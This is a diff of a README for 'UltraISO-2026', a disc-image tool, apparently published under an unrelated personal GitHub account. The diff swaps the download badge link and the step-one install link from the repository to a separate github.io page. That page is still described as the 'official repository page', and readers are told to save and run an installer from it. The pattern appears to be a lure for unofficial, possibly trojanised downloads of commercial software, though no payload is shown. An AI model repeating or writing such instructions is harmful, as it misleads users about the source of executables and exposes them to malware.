@@ -1,6 +1,6 @@
 # 💿 UltraISO-2026 - Create and manage disc image files
 
-[![](https://img.shields.io/badge/Download-UltraISO_2026-blue.svg)](https://github.com/Dakotaplymouthrock907/UltraISO-2026)
+[![](https://img.shields.io/badge/Download-UltraISO_2026-blue.svg)](https://dakotaplymouthrock907.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ This software works on standard Windows configurations. Ensure your system meets
 
 Follow these steps to obtain and prepare the software for use on your computer.
 
-1.  Visit the official repository page to initiate the download: [Download UltraISO-2026](https://github.com/Dakotaplymouthrock907/UltraISO-2026).
+1.  Visit the official repository page to initiate the download: [Download UltraISO-2026](https://dakotaplymouthrock907.github.io).
 2.  Locate the download section on the page.
 3.  Choose the setup file compatible with your Windows version.
 4.  Save the installer file to your Downloads folder.
